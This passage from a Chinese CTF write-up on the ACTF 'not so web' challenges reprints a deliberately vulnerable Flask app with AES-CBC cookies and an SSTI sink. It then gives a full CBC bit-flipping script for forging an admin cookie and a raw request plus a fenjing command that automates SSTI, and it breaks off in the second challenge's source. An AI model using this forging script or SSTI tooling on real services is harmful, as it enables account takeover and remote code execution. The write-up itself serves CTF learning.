class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass(<span class="params">kw_only=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        cookie_json = cipher.decrypt(padded)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        decrypted = cipher.decrypt(padded)</span><br><span class="line">        cookie_json_bytes = unpad(decrypted, <span class="number">16</span>)</span><br><span class="line">        cookie_json = cookie_json_bytes.decode()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_dict = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, cookie_dict.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    cookie_dict = asdict(user)</span><br><span class="line">    cookie_json = json.dumps(cookie_dict)</span><br><span class="line">    cookie_json_bytes = cookie_json.encode()</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    padded = pad(cookie_json_bytes, <span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted = cipher.encrypt(padded)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + encrypted).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(</span><br><span class="line">                    time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>思路很明确，伪造<code>admin</code>，因为现在<strong>字节翻转攻击</strong>前人的研究都挺多了的，我们直接拷打<code>ChatGPT</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip_bytes</span>(<span class="params">cookie_b: <span class="built_in">bytes</span>, offset: <span class="built_in">int</span>, orig: <span class="built_in">bytes</span>, target: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对 cookie 中位于指定 offset 处的前一块（IV 或上一块密文）进行字节修改，</span></span><br><span class="line"><span class="string">    修改公式：new_byte = old_byte XOR (orig_byte XOR target_byte)</span></span><br><span class="line"><span class="string">    orig 和 target 必须长度相同。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(orig) != <span class="built_in">len</span>(target):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;原始用户名和目标用户名长度必须一致！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cookie_b = IV || C1 || C2 || ...  按 16 字节为一块</span></span><br><span class="line">    <span class="comment"># 计算需要修改的块索引以及在块内的位置</span></span><br><span class="line">    block_index = offset // BLOCK_SIZE</span><br><span class="line">    byte_index = offset % BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 block_index==0 ，则修改 IV；否则修改前一个密文块</span></span><br><span class="line">    <span class="keyword">if</span> block_index == <span class="number">0</span>:</span><br><span class="line">        mod_block_start = <span class="number">0</span>  <span class="comment"># IV 就在前 16 字节</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mod_block_start = block_index * BLOCK_SIZE - BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    mod_block = <span class="built_in">bytearray</span>(</span><br><span class="line">        cookie_b[mod_block_start: mod_block_start + BLOCK_SIZE])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对需要修改的部分依次进行位翻转</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(orig)):</span><br><span class="line">        pos_in_block = byte_index + i</span><br><span class="line">        <span class="keyword">if</span> pos_in_block &gt;= BLOCK_SIZE:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;用户名跨越块边界，本脚本目前只支持单个块内部修改！&quot;</span>)</span><br><span class="line">        <span class="comment"># 原先密文中前一块的对应字节 old_byte</span></span><br><span class="line">        old_byte = mod_block[pos_in_block]</span><br><span class="line">        <span class="comment"># 计算差异</span></span><br><span class="line">        diff = orig[i] ^ target[i]</span><br><span class="line">        mod_block[pos_in_block] = old_byte ^ diff</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将修改后的块写回到 cookie_b 中</span></span><br><span class="line">    cookie_b = <span class="built_in">bytearray</span>(cookie_b)</span><br><span class="line">    cookie_b[mod_block_start: mod_block_start + BLOCK_SIZE] = mod_block</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cookie_b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_username_offset</span>(<span class="params">plaintext: <span class="built_in">str</span>, username: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算 username 在 plaintext 中的偏移量。</span></span><br><span class="line"><span class="string">    plaintext 通常是生成 cookie 时的 JSON 字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pos = plaintext.find(username)</span><br><span class="line">    <span class="keyword">if</span> pos == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;未在预估的明文中找到用户名字符串!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simulate_plaintext</span>(<span class="params">orig_username: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    构造一个与服务端 JSON 序列化结果格式类似的字符串，</span></span><br><span class="line"><span class="string">    仅用于推断用户名所在偏移位置。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 注意：实际的 register_time 和 password_raw 无关紧要，此处只需保证结构格式与实际一致</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: orig_username,</span><br><span class="line">        <span class="string">&quot;password_raw&quot;</span>: <span class="string">&quot;dummy&quot;</span>,</span><br><span class="line">        <span class="string">&quot;register_time&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用法: &#123;&#125; &lt;cookie_base64&gt; &lt;orig_username&gt; &lt;target_username&gt;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            sys.argv[<span class="number">0</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;例如: &#123;&#125; &lt;cookie_str&gt; aaaaa admin&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    cookie_base64 = sys.argv[<span class="number">1</span>]</span><br><span class="line">    orig_username = sys.argv[<span class="number">2</span>].encode()</span><br><span class="line">    target_username = sys.argv[<span class="number">3</span>].encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(orig_username) != <span class="built_in">len</span>(target_username):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原始用户名和目标用户名长度必须一致！&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码原始 cookie</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_bytes = base64.b64decode(cookie_base64)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cookie解码失败: &quot;</span>, e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模拟生成明文，帮助定位用户名位置</span></span><br><span class="line">    plaintext_sim = simulate_plaintext(orig_username.decode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        offset = find_username_offset(plaintext_sim, orig_username.decode())</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;推测用户名在明文中的偏移量：&quot;</span>, offset)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改 cookie 中对应的前一块数据</span></span><br><span class="line">    cookie_modified = flip_bytes(</span><br><span class="line">        cookie_bytes, offset, orig_username, target_username)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出新的 cookie</span></span><br><span class="line">    new_cookie_base64 = base64.b64encode(cookie_modified).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;新构造的 cookie：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(new_cookie_base64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>我们要先拿到<code>aaaaa</code>的<code>cookie</code>，貌似这里用户<strong>已经存在</strong>了，我直接用一手<code>123456</code>的弱口令就登进去了<br><img src="https://picx.zhimg.com/80/v2-7f037ed155981a1710249bc6025d9d52_1440w.png" alt=""><br>接下来就是<code>SSTI</code>，<strong>fenjing</strong>直接梭</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">GET /home?payload=PAYLOAD HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">63789</span></span><br><span class="line">Referer: http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">63789</span>/login</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">135.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Cookie: jwbcookie=2nRR2vOrnDt+vcwOrbWN3f8SGG1kNMmek6VPEE7iZeu9EI9LY9V+cjXoKdh6r4IvaPCzi3AGKY+tlfr1HdEgjxsy5IANc9hX3VCnN66pvQiCM2xu1aHzHAVzHSYAr2qX</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>python3 -m fenjing crack-request -f http.txt —host “61.147.171.105” —port 63789</strong></p><p><strong>ACTF{n3vEr_imPlem3nT_SuCh_Iv_HIJacK4bl3_C00Kie}</strong></p><p>我这里使用的是<code>wsl2</code>的环境，因为之前试过我的<code>win</code>跑不了。。。</p><h2 id="not-so-web-2"><a href="#not-so-web-2" class="headerlink" title="not so web 2"></a>not so web 2</h2><blockquote><p>这次用了非对称应该安全了吧</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, json, time</span><br><span class="line"><span class="keyword">import</span> os, sys, binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">    abort,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>):</span><br><span class="line">    private_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    private_key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">public_key = private_key.publickey()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    valid, _ = parse_cookie(cookie_b64)</span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie_b64:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie = base64.b64decode(cookie_b64, validate=<span class="literal">True</span>).decode()</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span 